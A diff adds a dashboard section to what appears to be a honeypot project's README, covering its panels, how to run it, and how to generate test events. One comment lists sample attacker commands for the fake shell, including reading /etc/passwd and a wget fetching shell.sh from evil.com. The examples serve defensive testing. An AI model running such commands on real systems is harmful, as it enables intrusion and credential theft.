@@ -98,6 +98,53 @@ curl http://127.0.0.1:8080/phpinfo.php
 
 ---
 
+## Dashboard
+
+The dashboard runs at [http://localhost:3000](http://localhost:3000) and visualizes all data captured by the SSH and web honeypots in real time. It reads from the shared SQLite database and JSONL log file that both honeypots write to, and auto-refreshes every 15 seconds without a full page reload.
+
+### What it shows
+
+| Panel | Description |
+|-------|-------------|
+| **Summary cards** | Total events, sessions, SSH vs web session split, unique source IPs, and bot vs human SSH command counts |
+| **Event timeline** | Hourly bar chart of event volume over the last 24 hours |
+| **Event types** | Doughnut chart breaking down event categories (auth attempts, commands, SQL injections, path probes, scanner fingerprints, etc.) |
+| **Service breakdown** | Share of events originating from the SSH honeypot vs the web honeypot |
+| **Top credentials** | Most frequently attempted username/password combinations across both services |
+| **Top source IPs** | Most active attacker IP addresses by event count |
+| **Top SSH commands** | Most common commands run inside fake SSH shell sessions |
+| **Recent events feed** | Live table of the last 50 events showing timestamp, service, event type, source IP, and detail |
+
+### Running the dashboard
+
+```bash
+# Start with the full stack (recommended)
+docker compose up
+
+# Or run standalone for development
+cd dashboard
+pip install Flask==3.0.0
+python app.py
+```
+
+### Generating data to visualize
+
+The dashboard will show empty panels until events are captured. To populate it:
+
+```bash
+# SSH — connect and run commands inside the fake shell
+ssh root@localhost -p 2222        # accepts any password
+ssh admin@localhost -p 2222
+ssh ubuntu@localhost -p 2222
+
+# Inside the fake shell, try common attacker commands:
+# whoami, id, ls -la, cat /etc/passwd, ps aux, netstat, wget http://evil.com/shell.sh, sudo su
+```
+
+For web events, visit [http://localhost:8080](http://localhost:8080) in a browser, log in with any credentials, run SQL queries in the SQL tab, or access honey files like `/.env` and `/config.inc.php.bak`.
+
+---
+
 ## Services at a Glance
 
 | Service | Local URL | What it does |
